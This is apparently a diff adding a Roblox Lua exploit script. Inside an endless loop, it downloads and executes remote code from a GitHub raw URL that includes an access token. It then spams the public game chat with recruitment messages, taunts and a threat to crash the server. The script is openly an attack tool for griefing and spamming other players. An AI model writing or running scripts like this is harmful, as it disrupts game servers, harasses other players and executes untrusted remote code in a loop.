@@ -1,0 +1,23 @@
+while true do
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k00pizillakidd/k00psoundspam/e666494df1d1a93ab8526e871e14d047ec0c9557/spamlol?token=GHSAT0AAAAAACQNGJXC3BTFUHSWRIALWTPGZQLQPKQ",true))()
+
+local A_1 = "join team k00pizillakidD today! "
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+
+local A_1 = "i will crash this server!!!!! "
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+
+local A_1 = "lol???!??!?! "
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+
+local A_1 = "this game has been goosed by k00pizillakidd! "
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+end
